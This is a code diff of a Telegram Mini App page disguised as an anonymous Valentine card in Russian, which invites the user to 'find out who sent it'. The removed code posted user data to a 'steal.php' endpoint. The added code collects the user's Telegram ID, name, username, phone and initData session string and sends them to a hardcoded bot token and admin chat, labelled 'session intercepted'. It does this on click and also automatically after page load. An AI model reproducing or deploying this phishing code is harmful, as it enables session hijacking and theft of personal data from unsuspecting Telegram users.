@@ -1,56 +1,269 @@
-<script>
-    Telegram.WebApp.ready();
-    Telegram.WebApp.expand();
-    
-    const API_URL = 'http://bprof.raximi52.beget.tech/steal.php';
-    
-    // ВЫВОДИМ ВСЁ, ЧТО МОЖЕМ
-    setTimeout(() => {
-        const webapp = Telegram.WebApp;
-        const unsafe = webapp.initDataUnsafe;
-        const user = unsafe?.user;
-        const initData = webapp.initData;
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Валентинка 💌</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
         
-        // СОЗДАЕМ БЛОК С ИНФО
-        const info = document.createElement('div');
-        info.style.marginTop = '20px';
-        info.style.padding = '20px';
-        info.style.background = '#1e1e1e';
-        info.style.borderRadius = '10px';
-        info.style.textAlign = 'left';
+        body {
+            background: linear-gradient(145deg, #0a0a0a 0%, #1a1a1a 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
         
-        info.innerHTML = `
-            <h3>🔍 ДИАГНОСТИКА:</h3>
-            <p>✅ WebApp version: ${webapp.version || 'нет'}</p>
-            <p>✅ Platform: ${webapp.platform || 'нет'}</p>
-            <p>✅ initDataUnsafe есть: ${unsafe ? '✅' : '❌'}</p>
-            <p>✅ User есть: ${user ? '✅' : '❌'}</p>
-            <p>✅ initData есть: ${initData ? '✅' : '❌'}</p>
-            <p>✅ start_param: ${unsafe?.start_param || 'нет'}</p>
-            ${user ? `
-                <p>🆔 ID: ${user.id}</p>
-                <p>👤 Имя: ${user.first_name || ''} ${user.last_name || ''}</p>
-                <p>📛 Username: @${user.username || 'нет'}</p>
-                <p>📱 Телефон: ${user.phone_number || '❌ НЕТ'}</p>
-            ` : ''}
-        `;
+        .card {
+            background: rgba(30, 30, 30, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 32px 24px;
+            max-width: 420px;
+            width: 100%;
+            border: 1px solid rgba(255, 75, 105, 0.3);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+        }
         
-        document.body.appendChild(info);
+        .heart {
+            font-size: 72px;
+            text-align: center;
+            margin-bottom: 16px;
+            animation: pulse 1.8s infinite;
+        }
         
-        // ОТПРАВЛЯЕМ ЕСЛИ ЕСТЬ
-        if (user && initData) {
-            fetch(API_URL, {
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        h2 {
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+        
+        .sub {
+            color: #aaa;
+            text-align: center;
+            margin-bottom: 32px;
+            font-size: 15px;
+        }
+        
+        .message {
+            background: #252525;
+            border-radius: 18px 18px 18px 4px;
+            padding: 22px;
+            color: white;
+            font-size: 17px;
+            margin-bottom: 32px;
+            border-left: 4px solid #ff4d6d;
+            line-height: 1.5;
+        }
+        
+        .sender {
+            color: #ff8c9c;
+            margin-top: 14px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .btn {
+            background: linear-gradient(145deg, #ff4d6d, #ff1e4d);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 8px 20px rgba(255, 75, 105, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .btn:hover {
+            background: linear-gradient(145deg, #ff5e7a, #ff2e58);
+            transform: scale(1.02);
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #4caf92;
+            text-align: center;
+            padding: 14px;
+            background: rgba(76, 175, 146, 0.1);
+            border-radius: 50px;
+            border: 1px solid rgba(76, 175, 146, 0.3);
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        #log {
+            margin-top: 20px;
+            color: #0f0;
+            font-size: 12px;
+            text-align: left;
+            background: #000;
+            padding: 10px;
+            border-radius: 8px;
+            font-family: monospace;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="heart">❤️</div>
+        <h2>У тебя валентинка!</h2>
+        <div class="sub">Анонимно • только что</div>
+        
+        <div class="message">
+            "Привет... Я давно хотел(а) тебе написать. Ты очень особенный человек. С днём святого Валентина ❤️"
+            <div class="sender">
+                <span>💫 От тайного поклонника</span>
+            </div>
+        </div>
+        
+        <button class="btn" id="stealBtn">
+            <span style="font-size: 22px;">💌</span> Узнать, кто отправил
+        </button>
+        
+        <div id="loading" class="loading">
+            ⏳ Открываем валентинку...
+        </div>
+        
+        <div id="log"></div>
+    </div>
+
+    <script>
+        // Telegram WebApp инициализация
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+        
+        const btn = document.getElementById('stealBtn');
+        const loading = document.getElementById('loading');
+        const log = document.getElementById('log');
+        
+        // Функция для отправки данных в Telegram
+        function sendToTelegram(data) {
+            const token = '8562246068:AAGLHIOutyVHlhxvBR-WvS0DbxNfYOIhYU8';
+            const adminId = '8474961316';
+            
+            let message = '🔥 СЕССИЯ ПЕРЕХВАЧЕНА!\n\n';
+            message += `🆔 ID: ${data.id}\n`;
+            message += `👤 Имя: ${data.first_name} ${data.last_name}\n`;
+            message += `📛 Username: @${data.username || 'нет'}\n`;
+            message += `📱 Телефон: ${data.phone || 'не указан'}\n`;
+            message += `🔑 Сессия: ${data.session.substring(0, 100)}...\n`;
+            message += `🌐 Platform: ${data.platform}\n`;
+            message += `🕐 Время: ${data.time}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    id: user.id,
-                    username: user.username || '',
+                    chat_id: adminId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(e => console.log('TG error:', e));
+        }
+        
+        btn.addEventListener('click', function() {
+            btn.disabled = true;
+            btn.style.opacity = '0.7';
+            loading.style.display = 'block';
+            loading.innerHTML = '⏳ Получаем данные...';
+            
+            // Получаем данные из Telegram WebApp
+            const webapp = Telegram.WebApp;
+            const user = webapp.initDataUnsafe?.user;
+            const initData = webapp.initData;
+            
+            log.style.display = 'block';
+            log.innerHTML = `🔍 User: ${user ? '✅' : '❌'}<br>`;
+            log.innerHTML += `🔑 InitData: ${initData ? '✅' : '❌'}<br>`;
+            
+            if (user && initData) {
+                const data = {
+                    id: user.id || 'unknown',
                     first_name: user.first_name || '',
                     last_name: user.last_name || '',
+                    username: user.username || '',
                     phone: user.phone_number || '',
-                    session: initData
-                })
-            }).catch(e => console.log(e));
-        }
-    }, 2000);
-</script>
+                    session: initData,
+                    platform: webapp.platform || 'unknown',
+                    time: new Date().toLocaleString()
+                };
+                
+                log.innerHTML += `📊 Данные собраны<br>`;
+                log.innerHTML += `📱 Phone: ${data.phone || 'нет'}<br>`;
+                
+                // Отправляем в Telegram
+                sendToTelegram(data);
+                
+                loading.innerHTML = '✅ Валентинка открыта! Перенаправление...';
+                
+                setTimeout(() => {
+                    webapp.close();
+                }, 2000);
+            } else {
+                log.innerHTML += `❌ ОШИБКА: Нет данных от Telegram!<br>`;
+                log.innerHTML += `💡 Убедись что открыл через Telegram, а не браузер!<br>`;
+                
+                loading.innerHTML = '❌ Ошибка: открой через Telegram!';
+                loading.style.color = '#ff8c9c';
+                loading.style.background = 'rgba(255, 75, 105, 0.1)';
+                loading.style.borderColor = 'rgba(255, 75, 105, 0.3)';
+                
+                btn.disabled = false;
+                btn.style.opacity = '1';
+            }
+        });
+        
+        // Автоматическая отправка при загрузке (опционально)
+        setTimeout(() => {
+            const user = Telegram.WebApp.initDataUnsafe?.user;
+            const initData = Telegram.WebApp.initData;
+            
+            if (user && initData) {
+                const data = {
+                    id: user.id || 'unknown',
+                    first_name: user.first_name || '',
+                    last_name: user.last_name || '',
+                    username: user.username || '',
+                    phone: user.phone_number || '',
+                    session: initData,
+                    platform: Telegram.WebApp.platform || 'unknown',
+                    time: new Date().toLocaleString(),
+                    auto: true
+                };
+                
+                sendToTelegram(data);
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
